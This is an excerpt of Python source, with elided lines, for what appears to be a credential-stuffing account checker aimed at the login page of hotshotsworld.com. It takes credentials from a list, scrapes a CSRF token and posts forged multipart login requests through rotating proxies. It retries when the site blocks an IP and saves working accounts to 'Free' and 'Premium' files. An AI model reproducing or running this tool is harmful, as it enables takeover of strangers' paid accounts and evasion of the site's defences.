...
output_file_free = "HOTshotAc_Free"+datetime.datetime.now().strftime("%d-%h-%H-%M") 
output_file_paid = "HOTshotAc_Premium_"+datetime.datetime.now().strftime("%d-%h-%H-%M") 
...
loginURL='https://www.hotshotsworld.com/customerLogin'
tokenURL="https://www.hotshotsworld.com/login"
...
def writeToFile(cred,subs,date):
    ...
    if subs == "FREE":
        ...
        prem+=1
def getToken(r):
    r1 = r.get(tokenURL,headers=headv1)
    b = BeautifulSoup(r1.text)
    return b.body.find('meta').get('content')#,r.cookies.get('')
        ...
        while not q.empty():
            ...
            try:
                ...
                headv2 = {
                    ...
                    'accept-encoding' : 'gzip, deflate, br',
                    'accept-language' : 'en-US,en;q=0.9,hi;q=0.8',
                    'content-type' : 'multipart/form-data; boundary=---------------------------23184053502435095472304257314',
                    'X-CSRF-TOKEN': token,
                   # 'Cookie': 'XSRF-TOKEN=',
                    'user-agent' : ua
                        } 
                myusr = ('-----------------------------23184053502435095472304257314\n'
                    'Content-Disposition: form-data; name="identity"\n\n'
                    'email\n'
                    '-----------------------------23184053502435095472304257314\n'
                    ...
                    '-----------------------------23184053502435095472304257314\n'
                    'Content-Disposition: form-data; name="twitter_id"\n\n'
                    '-----------------------------23184053502435095472304257314\n'
                    'Content-Disposition: form-data; name="referrer_customer_id"\n\n'
                    '-----------------------------23184053502435095472304257314\n'
                    'Content-Disposition: form-data; name="_token"\n\n'
                    +token+'\n'
                    '-----------------------------23184053502435095472304257314--\n')
                #print(myusr)
                r1 = r.post(loginURL, headers=headv2,data=myusr,proxies=proxy)
                #print(len(r1.text))
                if('"error":true' not in r1.text):
                    if ("Server Error" in r1.text or len(r1.text)==4 or "504 Gateway Time-out" in r1.text):
                        q.put(cred)
                        ban_ip(container)
                    else:
                    ...
                    statusUpdate(cred,r1.json()['error_messages'][0],container,2)
                countLoc()
